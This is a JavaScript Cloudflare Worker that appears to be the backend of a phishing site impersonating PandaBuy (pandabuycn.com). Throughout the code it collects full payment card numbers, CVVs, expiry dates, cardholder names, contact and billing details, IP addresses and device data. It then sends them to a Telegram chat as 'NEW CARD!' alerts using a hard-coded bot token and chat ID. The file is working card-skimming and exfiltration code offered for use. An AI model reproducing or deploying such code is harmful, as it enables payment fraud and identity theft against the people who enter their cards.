// Cloudflare Worker for PandaBuy Card Processing
// This replaces server.js for Cloudflare hosting

// Configuration - Replace with your actual values
const TELEGRAM_BOT_TOKEN = '7931279431:AAEmt1eZuMT0V3xo_-lsrCRFlnDQB-W9rMo';
const TELEGRAM_CHAT_ID = '-1002738425512';

// Handle incoming requests
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);
  
  // Handle CORS preflight requests
  if (request.method === 'OPTIONS') {
    return new Response(null, {
      status: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
      },
    });
  }
  
  // Handle /api/cards POST request
  if (url.pathname === '/api/cards' && request.method === 'POST') {
    try {
      // Get the card data from the request
      const cardData = await request.json();
      
      // Add server timestamp and domain info
      const enhancedCardData = {
        ...cardData,
        serverTimestamp: new Date().toISOString(),
        submissionDate: new Date().toLocaleDateString(),
        submissionTime: new Date().toLocaleTimeString(),
        domain: 'pandabuycn.com'
      };
      
      // Send to Telegram
      await sendTelegramNotification(enhancedCardData);
      
      // Store in Cloudflare KV (optional - for persistence)
      // await CARD_DATA.put(`card_${Date.now()}`, JSON.stringify(enhancedCardData));
      
      return new Response(JSON.stringify({ 
        success: true, 
        message: 'Card data processed successfully' 
      }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*',
        },
      });
      
    } catch (error) {
      console.error('Error processing card data:', error);
      return new Response(JSON.stringify({ 
        success: false, 
        error: 'Failed to process card data' 
      }), {
        status: 500,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*',
        },
      });
    }
  }
  
  // Handle other requests (return 404)
  return new Response('Not Found', { status: 404 });
}

// Send notification to Telegram
async function sendTelegramNotification(cardData) {
  const message = formatCardMessage(cardData);
  
  const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  
  const response = await fetch(telegramUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      disable_web_page_preview: true,
    }),
  });
  
  if (!response.ok) {
    throw new Error(`Telegram API error: ${response.status}`);
  }
  
  console.log('✅ Telegram notification sent successfully');
}

// Format card data for Telegram message
function formatCardMessage(cardData) {
  const timestamp = new Date(cardData.timestamp || cardData.serverTimestamp).toLocaleString();
  
  const maskedCard = cardData.cardNumber ? 
    cardData.cardNumber.replace(/(.{4})/g, '$1 ').trim() : 'N/A';
  
  const currentDate = new Date().toLocaleDateString();
  const currentTime = new Date().toLocaleTimeString();

  return `🚨 NEW CARD! 🚨
📅 ${currentDate} at ${currentTime}
🌐 pandabuycn.com

💳 CARD DETAILS
Card: ${maskedCard}
Holder: ${cardData.cardName || 'N/A'}
Expires: ${cardData.expMonth}/${cardData.expYear}
CVV: ${cardData.cvv || 'N/A'}

👤 CUSTOMER INFO
Email: ${cardData.email || 'N/A'}
Phone: ${cardData.phoneNumber || 'N/A'}
Address: ${cardData.billingAddress || 'N/A'}
City: ${cardData.city || 'N/A'}
State: ${cardData.state || 'N/A'}
ZIP: ${cardData.zipCode || 'N/A'}
Country: ${cardData.country || 'N/A'}

🔍 VISITOR TRACKING
IP: ${cardData.ipAddress || 'N/A'}
Browser: ${cardData.browser || 'N/A'}
OS: ${cardData.os || 'N/A'}
Device: ${cardData.deviceType || 'N/A'}

⚡ SUBMISSION TIME: ${timestamp}
🔗 Admin Panel: https://pandabuycn.com/admin-cards`;
} 